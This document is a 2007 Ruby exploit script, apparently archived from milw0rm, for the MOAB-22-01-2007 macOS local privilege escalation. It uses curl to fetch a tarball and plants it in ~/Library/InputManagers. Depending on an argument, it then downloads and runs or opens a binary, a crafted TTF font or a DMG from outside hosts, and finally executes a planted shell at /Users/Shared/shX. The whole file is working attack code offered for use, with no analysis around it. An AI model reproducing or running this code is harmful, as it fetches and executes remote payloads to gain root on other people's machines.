#!/usr/bin/ruby
# Copyright (c) 2007 Kevin Finisterre <kf_lists [at] digitalmunition.com>
#                    Lance M. Havok   <lmh [at] info-pull.com>
# All pwnage reserved.
#
# "Exploit" for MOAB-22-01-2007: All your crash are belong to us.
#

require 'fileutils'

bugselected = (ARGV[0] || 0).to_i

# INPUTMANAGER_URL    = "http://projects.info-pull.com/moab/bug-files/MOAB-22-01-2007_im.tar.gz"
# keeping a local backup. /str0ke
INPUTMANAGER_URL    = "https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/3181.tar.gz"
INPUTMANAGER_PLANT  = "/usr/bin/curl -o /tmp/moab_im.tar.gz #{INPUTMANAGER_URL};"             +
                      "mkdir -p ~/Library/InputManagers/;"                                    +
                      "cd ~/Library/InputManagers/;"                                          +
                      "tar -zxvf /tmp/moab_im.tar.gz"

case bugselected
  when 0
    target_url  = "http://projects.info-pull.com/moab/bug-files/notification"
	  trigger_cmd = "curl -o /tmp/notify #{target_url} ; /tmp/notify &"
  when 1
    target_url  = "http://projects.info-pull.com/moab/bug-files/pwned-ex-814.ttf"
	  trigger_cmd = "/usr/bin/curl -o /tmp/pwned-ex-814.ttf #{target_url}; open /tmp/pwned-ex-814.ttf"
  when 2
    target_url  = "http://projects.info-pull.com/moab/bug-files/MOAB-10-01-2007.dmg.gz"
	  trigger_cmd = "/usr/bin/curl -o /tmp/moab_dmg.gz #{target_url}; cd /tmp; gunzip moab_dmg.gz; open MOAB-10-01-2007.dmg"	
end

CMD_LINE = "#{INPUTMANAGER_PLANT} ; #{trigger_cmd}"

def escalate()
  puts "++ Welcome to Pwndertino..."
  system CMD_LINE
  sleep 5
  system "/Users/Shared/shX" 
end

escalate()

# milw0rm.com [2007-01-23]